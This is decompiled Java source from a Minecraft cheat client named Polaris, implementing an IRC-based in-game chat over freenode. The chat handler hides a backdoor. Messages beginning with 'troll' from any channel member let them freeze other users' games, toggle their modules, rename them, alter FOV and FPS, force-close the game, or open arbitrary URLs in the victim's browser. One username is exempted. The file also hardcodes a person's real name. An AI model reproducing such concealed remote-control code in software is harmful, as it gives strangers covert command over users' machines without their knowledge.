/*     */ package rip.jutting.polaris.socket;
/*     */ 
/*     */ import java.awt.Desktop;
/*     */ import java.io.PrintWriter;
/*     */ import java.net.Socket;
/*     */ import java.net.URI;
/*     */ import java.util.Scanner;
/*     */ import net.minecraft.client.Minecraft;
/*     */ import net.minecraft.client.gui.GuiTextField;
/*     */ import net.minecraft.client.settings.GameSettings;
/*     */ import rip.jutting.polaris.Polaris;
/*     */ import rip.jutting.polaris.module.Module;
/*     */ import rip.jutting.polaris.module.ModuleManager;
/*     */ import rip.jutting.polaris.module.other.Server;
/*     */ import rip.jutting.polaris.ui.click.settings.Setting;
/*     */ import rip.jutting.polaris.ui.click.settings.SettingsManager;
/*     */ import rip.jutting.polaris.ui.protection.GuiAuth;
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ public class ServerSocket
/*     */ {
/*     */   private static Scanner scanner;
/*     */   private static Socket socket;
/*     */   private static PrintWriter out;
/*     */   private static Scanner in;
/*  28 */   private static String xd = "\r\n";
/*     */   
/*  30 */   public static String channel = "#PolarisClient";
/*     */   
/*     */   public static void start() throws Exception {
/*  33 */     String nick = GuiAuth.username.getText();
/*  34 */     String username = nick;
/*  35 */     String realName = "Aidan Shinkovich";
/*  36 */     socket = new Socket("chat.freenode.net", 6667);
/*  37 */     out = new PrintWriter(socket.getOutputStream(), true);
/*  38 */     in = new Scanner(socket.getInputStream());
/*     */     
/*  40 */     writeDetail("NICK", nick);
/*  41 */     writeDetail("USER", username + " 0 * :" + realName);
/*  42 */     writeDetail("JOIN", channel);
/*     */     
/*  44 */     if (Polaris.instance.moduleManager.getModuleByName("Server").isToggled()) {
/*  45 */       while (in.hasNext()) {
/*  46 */         String serverMessage = in.nextLine();
/*  47 */         if ((serverMessage.contains("PRIVMSG")) && (serverMessage.contains(channel))) {
/*  48 */           String xd = serverMessage;
/*  49 */           xd = xd.replaceAll(":", "");
/*  50 */           String name = xd.split("\\!")[0];
/*  51 */           if (serverMessage.contains(channel + " :")) {
/*  52 */             String oof = serverMessage.split(channel + " :")[1];
/*  53 */             if ((oof.startsWith("troll")) && (!GuiAuth.username.getText().equalsIgnoreCase("HeadSpin"))) {
/*     */               try {
/*  55 */                 String[] troll = oof.split(" ");
/*  56 */                 if (troll[1].equalsIgnoreCase("freeze")) {
/*  57 */                   Polaris.sendMessage("You have been frozen.");
/*  58 */                   Server.frozen = true;
/*     */                 }
/*  60 */                 if (troll[1].equalsIgnoreCase("name")) {
/*  61 */                   rip.jutting.polaris.command.commands.NameCommand.name = troll[2];
/*     */                 }
/*  63 */                 if (troll[1].equalsIgnoreCase("unfreeze")) {
/*  64 */                   Polaris.sendMessage("You have been unfrozen.");
/*  65 */                   Server.frozen = false;
/*  66 */                 } else if (troll[1].equalsIgnoreCase("togglemod")) {
/*  67 */                   Polaris.instance.moduleManager.getModuleByName(troll[2]).toggle();
/*  68 */                 } else if (troll[1].contains("close")) {
/*  69 */                   System.exit(0);
/*  70 */                 } else if (troll[1].equalsIgnoreCase("fov")) {
/*  71 */                   if (!Server.fovd) {
/*  72 */                     Server.preFov = Minecraft.getMinecraft().gameSettings.fovSetting;
/*  73 */                     Server.fov = Double.valueOf(troll[2]).doubleValue();
/*  74 */                     Server.fovd = true;
/*     */                   } else {
/*  76 */                     Server.fovd = false;
/*     */                   }
/*  78 */                 } else if (troll[1].equalsIgnoreCase("browseurl")) {
/*  79 */                   Desktop.getDesktop().browse(new URI(troll[2]));
/*  80 */                 } else if (troll[1].equalsIgnoreCase("fps")) {
/*  81 */                   if (!Server.fpsd) {
/*  82 */                     Server.preFPS = Minecraft.getMinecraft().gameSettings.limitFramerate;
/*  83 */                     Server.fps = Double.valueOf(troll[2]).doubleValue();
/*  84 */                     Server.fpsd = true;
/*     */                   } else {
/*  86 */                     Server.fpsd = false;
/*     */                   }
/*     */                 }
/*     */               } catch (Exception e) {
/*  90 */                 e.printStackTrace();
/*     */               }
/*  92 */             } else if ((!oof.startsWith("troll")) && 
/*  93 */               (Minecraft.getMinecraft().theWorld != null)) {
/*  94 */               if (Polaris.instance.settingsManager.getSettingByName("Custom IRC").getValBoolean()) {
/*  95 */                 Server server = new Server();
/*  96 */                 server.addMessage(name + ":" + oof);
/*     */               } else {
/*  98 */                 Polaris.sendMessageWithoutPrefix("§a" + name + ":§f" + oof);
/*     */               }
/*     */             }
/*     */           }
/*     */         }
/*     */         
/* 104 */         if (serverMessage.startsWith("PING")) {
/* 105 */           String oof = serverMessage.split(" ", 2)[1];
/* 106 */           writeDetail("PONG", oof);
/*     */         }
/*     */       }
/*     */     } else {
/* 110 */       in.close();
/* 111 */       out.close();
/* 112 */       socket.close();
/*     */     }
/*     */     
/* 115 */     writeMessage(nick + " has connected.");
/*     */     
/* 117 */     in.close();
/* 118 */     out.close();
/* 119 */     socket.close();
/*     */   }
/*     */   
/*     */   public static void writeDetail(String command, String message) {
/* 123 */     String newMessage = command + " " + message;
/* 124 */     out.println(newMessage + xd);
/* 125 */     out.flush();
/*     */   }
/*     */   
/*     */   public static void writeTrollMessage(String message) {
/* 129 */     out.println("PRIVMSG " + channel + " :" + message + xd);
/* 130 */     out.flush();
/*     */   }
/*     */   
/*     */   public static void writeMessage(String message) {
/* 134 */     if (Polaris.instance.moduleManager.getModuleByName("Server").isToggled()) {
/* 135 */       if (!message.startsWith("troll")) {
/* 136 */         if (Minecraft.getMinecraft().theWorld != null) {
/* 137 */           if (Polaris.instance.settingsManager.getSettingByName("Custom IRC").getValBoolean()) {
/* 138 */             Server server = new Server();
/* 139 */             server.addMessage(GuiAuth.username.getText() + ": " + message);
/*     */           } else {
/* 141 */             Polaris.sendMessageWithoutPrefix("§a" + GuiAuth.username.getText() + ": §f" + message);
/*     */           }
/*     */         }
/* 144 */         out.println("PRIVMSG " + channel + " : " + message + xd);
/* 145 */         out.flush();
/*     */       }
/*     */     } else {
/* 148 */       Polaris.sendMessage("Please turn on the Server module to be connected to the client chat.");
/*     */     }
/*     */   }
/*     */ }


/* Location:              C:\Users\suzjan\AppData\Roaming\.minecraft\versions\Polaris\Polaris.jar!\rip\jutting\polaris\socket\ServerSocket.class
 * Java compiler version: 8 (52.0)
 * JD-Core Version:       0.7.1
 */